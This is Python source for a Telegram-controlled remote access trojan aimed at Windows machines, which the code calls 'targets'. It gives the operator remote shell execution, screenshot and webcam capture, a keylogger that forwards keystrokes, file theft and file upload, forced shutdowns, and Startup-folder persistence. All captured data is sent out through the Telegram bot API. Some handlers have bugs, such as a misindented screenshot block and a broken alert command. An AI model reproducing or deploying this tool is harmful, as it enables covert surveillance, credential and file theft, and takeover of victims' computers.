import telebot
import pyautogui
import os
import subprocess
from time import sleep
import keyboard
import pywinauto
from pywinauto.application import Application
import shutil
import winsound
import cv2
import time
from pynput import keyboard
import requests
from random import randint
import urllib

bot_token = "YOUR_TOKEN"

bot = telebot.TeleBot(bot_token)

def Startup():
    a = 3 
    if a == 2 :
        pass
    else :
        with open('run.txt' ,'w') as File:
            File.write('main.exe')
        
        os.rename('run.txt', 'run.bat')
        
        startupPath = fr'C:\Users\{os.getenv("USERNAME")}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        currentPath = os.getcwd() + '\main.exe'
        
        shutil.copy(currentPath, startupPath)
        sleep(2)
        shutil.copy(os.getcwd()+ r'\run.bat', startupPath)
        
# Startup()
@bot.message_handler(commands=['Help'])
def help(msg):
    helpMsg = '''
    /Help --> Send list of commands 
    /screenShot --> Send a screen Shot from target
    /shutdown
    /restart
    /shell <comand>
    /write <text> -- > open notepad and type the text.
    /ip 
    /buzzer <time(m)>
    /webcam <time(s)> --> Send Video From Webcam
    /keyCountBase <chatCount> --> key loger based count of chars 
    /download <file_path>
    /upload <>
    /mkdir <directory> <folder_name>
    /alert <msg>
    '''
    bot.send_message(msg.chat.id, helpMsg)
@bot.message_handler(commands=['screenShot'])
def sendScreenShot(msg):
    screenShot = pyautogui.screenshot()
    screenShot.save('screen.png')


with open('screen.png', 'rb') as File:
    
    bot.send_photo(msg.chat.id, File)

try:
    os.remove('screen.png')

except :
    pass

        
    
    
@bot.message_handler(commands=['shutdown'])
def shutDown(msg):
    'Shut down the target system!'
    os.system('shutdown /s')
    bot.send_message(msg.chat.id, 'System Shotdowned!✅')
    
    
@bot.message_handler(commands=['shell'])
def commandEnter(msg):
    "Get the commond and run and send result for bot"
    command = str(msg.text).split('/shell')[1]
    
    commandRun = subprocess.run(command, shell=True, capture_output=True, text=True)
    commandResult = commandRun.stdout

    bot.send_message(msg.chat.id, f'Command Run!✅\nResult of this command: \n {commandResult}')
    
@bot.message_handler(commands=['restart'])
def restart(msg):
    'Restart the rarget system'
    os.system('shutdown /r')
    bot.send_message(msg.chat.id, 'Resrart Done!✅')
    
    
    
@bot.message_handler(commands=['write'])
def write(msg):
    
    
    # get user text from bot
    userText = str(msg.text).split('/write')[1]
    print(userText)
    
    
    # Select the note pad windows
    app = Application().start('notepad.exe')
    sleep(2)
    
    notepad = app['Untitled - Notepad']
    sleep(1)
    
    # set biger font
    notepad.menu_select('Format -> Font')
    sleep(1)
    
    font_page = app['Font']
    sleep(0.4)
    font_page['Edit3'].type_keys("40")
    sleep(0.4)
    
    font_page['OK'].click()
    sleep(0.4)
    
    
    notepad.set_focus()
    sleep(1)
    
    # type the text in the notepad
    pyautogui.write(userText)
    
    bot.send_message(msg.chat.id, 'Text Print in the note pad✅')
    
@bot.message_handler(commands=['ip'])
def Ip(msg):
    Local_result = subprocess.run('ipconfig', capture_output=True, text=True, shell=True)
    public_result = subprocess.run('nslookup myip.opendns.com resolver1.opendns.com', shell=True, capture_output=True, text=True)
    result_show = f'''
    🔒Local 
    {Local_result.stdout}
    📣Public 
    {public_result.stdout}
    '''
    
    bot.send_message(msg.chat.id, result_show)
    
@bot.message_handler(commands=['buzzer'])
def buzzer(msg):
    time = str(msg.text).split('/buzzer')[1]
    winsound.Beep(1000, int(time) * 1000)
    
    bot.send_message(msg.chat.id, 'buzzing was successfully completed.✅')


    
    
    
@bot.message_handler(commands=['webcam'])
def webcam(msg):
    
    video_dur = int(str(msg.text).split('/webcam')[1])
    webCam = cv2.VideoCapture(0)
    
    
    # Video Config
    frame_width = int(webCam.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(webCam.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fps = 20
    
    # create obj for create video 
    video = cv2.VideoWriter('output_video.avi', cv2.VideoWriter_fourcc(*'XVID'), fps, (frame_width, frame_height))

    if not webCam.isOpened():
        bot.send_message(msg.chat.id, 'Webcam not turning on❌')
    
    else :
        
        
        start_time = time.time()
        
        
        while True:
            isRead, frame = webCam.read()
            
            if not isRead : 
                bot.send_message(msg.chat.id, 'Images received from the webcam could not be analyzed.❌')
                break
                
            
            
            
            video.write(frame)
            
            # check time
            if time.time() - start_time >= video_dur :
                break
            
            
        print('Video Ended!')
        bot.send_message(msg.chat.id, 'Record Completed!😎')
                
                
        sleep(2)
                
        
        # send video 
        with open('output_video.avi', 'rb') as video:
            bot.send_video(msg.chat.id, video,timeout=200)
                
            
        sleep(3)
        # remove the video after sent
        os.remove('output_video.avi')
                
        webCam.release()
        cv2.destroyAllWindows()

@bot.message_handler(commands=['keyCountBase'])
def keysCountBase(msg):
    count = int(str(msg.text).split('/keyCountBase')[1])
    keys = []
    i = 0
    
    def send():
        nonlocal i 
        i += 1 
         
        message = ''.join(keys)
        message = f'Part {i} : \n' + message
        
        bot.send_message(msg.chat.id, message)
        
        # clear the keys list for save new btns 
        keys.clear()
        
    def btnPress(btn):
        
        try : 
            print(btn.char)
            keys.append(btn.char)
        except :
             
            # for shift , alt , ctrl , etc
            pass
        
        
        # check the count of items from the keys len
        
        if len(keys) >= 50 or len(keys) >= count:
            send()
    
    def release(btn):
        if i >= count :
            return False
        
    # keyboard.Listener stop when recieve a False value from the on_release   
    with keyboard.Listener(on_press=btnPress, on_release=release) as Listener:
        Listener.join()
        
@bot.message_handler(commands=['download'])
def download(msg):
    dir = fr'{str(msg.text).split('/download')[1].strip()}'
    print('dir:', dir)
    isDir = os.path.isdir(dir.strip())
    isFile = os.path.isfile(dir.strip())
    
    
    
    if(isDir):
        bot.send_message(msg.chat.id, 'You should send a file not a directory!❌')
    
    elif isFile:
        
        with open(dir.strip(), 'rb') as File:
            bot.send_document(msg.chat.id, File)
        
    else :
        bot.send_message(msg.chat.id, 'Error!❌')
        
        
flag = None
path = None
@bot.message_handler(commands=['upload'])
def upload(msg):
    global path
    path = msg.text.split('/upload')[1].strip()
    print(path)
    isPath = os.path.isdir(path)
    
    if isPath :
        bot.reply_to(msg, 'Send Your File...')
        global flag
        flag = True
    else :
        bot.send_message(msg.chat.id, '''
                        Error!❌
                        Make sure the file address is entered correctly.''')
        
        flag = False
@bot.message_handler(content_types=['document'])
def reciveFile(msg):
    
    # get information from document
    docId = msg.document.file_id
    docName = msg.document.file_name
    doc = bot.get_file(docId)
    docPath = doc.file_path
   

    docUrlForDownload = f"https://api.telegram.org/file/bot{bot.token}/{docPath}"
    
    global path
    uploadPath = os.path.join(path,docName)
    
    response = requests.get(docUrlForDownload)
    response.raise_for_status()
    
    
    # use context manager for save file at system
    with open(uploadPath, "wb") as File :
        File.write(response.content)
        
        
    bot.send_message(msg.chat.id, 'The operation was successful.✔')

@bot.message_handler(commands=['mkdir'])
def MakeDir(msg):
    
    input = msg.text.split('/mkdir')[1]
    
    
    
    dirAndFolderName = input.split(' ')
    
    flag = os.path.isdir(dirAndFolderName[1])
    
    # check the input is directory or no 
    if flag :
        try:
            
            # Exist ok = if the folder exists --> don't show error 
            # use makedir instead of mkdir --> don't show error if the folder existed
            
            os.makedirs(os.path.join(dirAndFolderName[1], dirAndFolderName[2]), exist_ok = True)
            
            bot.send_message(msg.chat.id, 'The operation was successful.✔')
                
        except :
            bot.send_message(msg.chat.id, 'Error❌')
    
    # The user input is not a directory or can not find the address in the system
    else :
        bot.send_message(msg.chat.id, 'The directory does not exist on the system.❌ or you enter the incorrect directory!')
        
        
@bot.message_handler(commands=['alert'])        
def Alert(msg):
    msg = msg.split('/alert')[1]
    os.system(f'msg * {msg.text}')
    
    bot.send_message(msg.chat.id, 'Operation Completed!')
    

bot.polling(non_stop=True, timeout=60, interval=1)

